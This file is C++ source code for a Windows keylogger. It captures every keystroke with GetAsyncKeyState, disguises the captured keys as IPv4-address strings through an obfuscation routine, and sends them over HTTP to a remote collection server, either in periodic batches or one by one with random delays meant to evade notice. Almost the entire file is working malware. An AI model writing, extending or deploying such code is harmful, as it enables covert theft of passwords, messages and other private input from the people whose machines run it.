#include "Transmission.h"
#include <windows.h>
#include "Keylogger.h"
#include "Obfuscation.h"
#include <stdio.h>
#include <time.h>
#include <queue>


std::queue<char*> keystrokeQueue;
CRITICAL_SECTION queueLock;

// Array to track the state of keys
#define KEY_COUNT 256
BYTE keyStates[KEY_COUNT];


void enqueueKeystroke(const char* obfuscatedKeystroke) {
    EnterCriticalSection(&queueLock);
    char* keystroke = _strdup(obfuscatedKeystroke); // Duplicate string to avoid overwriting
    keystrokeQueue.push(keystroke);
    LeaveCriticalSection(&queueLock);
}

void sendKeystrokesFromQueue(const char* serverUrl) {
    EnterCriticalSection(&queueLock);
    int batchSize = 5; // Number of keystrokes to send in one batch

    while (!keystrokeQueue.empty() && batchSize > 0) {
        char* keystroke = keystrokeQueue.front(); // Get the oldest keystroke
        keystrokeQueue.pop(); // Remove the firstly registered keystroke 

        // Send the keystrok to the server
        if (!sendIpv4ToServer(serverUrl, keystroke)) {
            fprintf(stderr, "Failed to send keystroke: %s\n", keystroke);
        }
        else {
            printf("Keystroke sent: %s\n", keystroke);
        }

        free(keystroke);
        batchSize--;
    }
    DeleteCriticalSection(&queueLock);
}

void sendKeystrokesIndividuallyWithRandomDelay(const char* serverUrl) {
    EnterCriticalSection(&queueLock);

    while (!keystrokeQueue.empty()) {
        char* keystroke = keystrokeQueue.front();  // Get the oldest keystroke
        keystrokeQueue.pop();  // Remove it from the queue

        LeaveCriticalSection(&queueLock);  // Unlock before sending to avoid blocking other threads

        // Send the keystroke to the server
        if (!sendIpv4ToServer(serverUrl, keystroke)) {
            fprintf(stderr, "Failed to send keystroke: %s\n", keystroke);
        }
        else {
            printf("Keystroke sent: %s\n", keystroke);
        }

        free(keystroke);  // Free the memory allocated for the keystroke

        // Generate a random delay between 5 and 10 seconds
        int randomDelay = 5 + (rand() % 6);  // rand() % 6 gives a range [0, 5]
        Sleep(randomDelay * 1000);  // Convert seconds to milliseconds

        EnterCriticalSection(&queueLock);  // Re-lock to continue processing
    }

    LeaveCriticalSection(&queueLock);
}

// Function to periodically send and clear keystrokes
void sendKeystrokesPeriodically(MemoryRegion* memRegion, const char* serverUrl) {
    // Check if there are keystrokes to send
    if (memRegion->used == 0) {
        return;  // No keystrokes to send
    }

    // Send the keystrokes as IPv4 addresses
    if (GenerateIpv4Output((unsigned char*)memRegion->baseAddress, memRegion->used, serverUrl)) {
        printf("Keystrokes sent successfully.\n");
    }
    else {
        fprintf(stderr, "Failed to send keystrokes.\n");
    }

    // Clear the memory region after sending
    memRegion->used = 0;
    memset(memRegion->baseAddress, 0, memRegion->size);
}

DWORD WINAPI keystrokeSenderThread(LPVOID param) {
    const char* serverUrl = (const char*)param;
    while (true) {
        // Check and send keystrokes one at a time
        sendKeystrokesIndividuallyWithRandomDelay(serverUrl);

        // Sleep for a while if there are no keystrokes to process
        Sleep(5000);
    }

    return 0;
}

void mainToUseThreadForSendingKeystrokesIndividuallyWithRandomDelay() {
    InitializeCriticalSection(&queueLock);

    const char* serverUrl = "http://192.168.2.181:6969/receive_ip";  // Change this later

    // Create the sender thread
    HANDLE senderThread = CreateThread(NULL, 0, keystrokeSenderThread, (LPVOID)serverUrl, 0, NULL);

    MemoryRegion memRegion;
    memRegion.baseAddress = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 100);
    memRegion.size = 100;
    memRegion.used = 0;

    if (memRegion.baseAddress == NULL) {
        perror("Failed to allocate memory");
       // return 1;
    }

    char i;
    while (true) {
        for (i = 8; i <= 255; i++) {
            if (GetAsyncKeyState(i) == -32767) {
                logKey(i, &memRegion);  // Log the keystroke locally

                char* obfuscated = GenerateIpv4(memRegion.baseAddress[0], memRegion.baseAddress[1],
                    memRegion.baseAddress[2], memRegion.baseAddress[3]);

                enqueueKeystroke(obfuscated);
                free(obfuscated);  // Free memory from `GenerateIpv4`

                // Reset the memory region for the next keystroke
                memRegion.used = 0;
                memset(memRegion.baseAddress, 0, memRegion.size);

                break;  // Break to the next key event
            }
        }
    }

    // Clean up resources (unlikely to reach here in this design)
    CloseHandle(senderThread);
    HeapFree(GetProcessHeap(), 0, memRegion.baseAddress);
    DeleteCriticalSection(&queueLock);

    //return 0;
}


int main() {
    MemoryRegion memRegion;
    memRegion.baseAddress = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 100);
    memRegion.size = 100;
    memRegion.used = 0;

    if (memRegion.baseAddress == NULL) {
        perror("Failed to allocate memory");
        return 1;
    }

    const char* serverUrl = "http://192.168.2.181:6969/receive_ip";  // Change as needed

    // Initialize keyStates array
    memset(keyStates, 0, sizeof(keyStates));

    while (1) {
        // Log keystrokes in real-time
        for (int i = 8; i < KEY_COUNT; i++) {
            SHORT keyState = GetAsyncKeyState(i);

            if (keyState & 0x8000) {  // Key is pressed
                if (keyStates[i] == 0) {  // Log only if key was not already pressed
                    logKey(i, &memRegion);
                    keyStates[i] = 1;  // Mark key as pressed
                }
            }
            else {
                keyStates[i] = 0;  // Reset key state when released
            }
        }

        // Periodically check every 5 seconds to send data
        static DWORD lastCheckTime = 0;
        DWORD currentTime = GetTickCount();
        if (currentTime - lastCheckTime >= 5000) {  // Check every 5 seconds
            sendKeystrokesPeriodically(&memRegion, serverUrl);
            lastCheckTime = currentTime;
        }

        Sleep(10);  // Sleep for a short interval to reduce CPU usage
    }

    // Cleanup memory (unlikely to reach here in this program design)
    HeapFree(GetProcessHeap(), 0, memRegion.baseAddress);
    return 0;
}